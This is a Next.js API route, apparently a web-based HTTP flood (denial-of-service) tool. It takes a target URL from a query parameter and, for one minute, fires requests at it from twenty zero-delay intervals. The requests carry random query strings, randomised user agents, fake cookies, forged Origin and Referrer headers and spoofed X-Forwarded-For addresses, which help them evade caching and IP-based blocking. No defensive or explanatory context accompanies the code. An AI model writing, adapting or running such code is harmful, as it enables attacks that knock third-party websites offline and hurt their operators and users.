import type { NextApiRequest, NextApiResponse } from 'next'

type ResponseData = {
    message: string
}


const rIp = () => {
    const r = () => Math.floor(Math.random() * 255);
    return `${r()}.${r()}.${r()}.${r()}`;
}

const rStr = (l: number) => {
    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < l; i++) {
        s += a[Math.floor(Math.random() * a.length)];
    }
    return s;
}

export default function handler(
    req: NextApiRequest,
    res: NextApiResponse<ResponseData>
) {

    for (var i = 0; i < 20; i++) {
        const luanch = setInterval(() => {
            fetch(`${req.query.name}?ref=${rStr(10)}`, {
                headers: {
                    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 ${rStr(10)}`,
                    'cookie': `key=${rStr(10)}`,
                    'Origin': `${req.query.name}`,
                    'Referrer': `${req.query.name}`,
                    'X-Forwarded-For': rIp()
                }
            }).then()
        })
        setTimeout(() => clearInterval(luanch), 60 * 1000)
    }

    setTimeout(() => {
        res.status(200).json({ message: `JK-${req.query.name}` })
    }, 20 * 1000)
}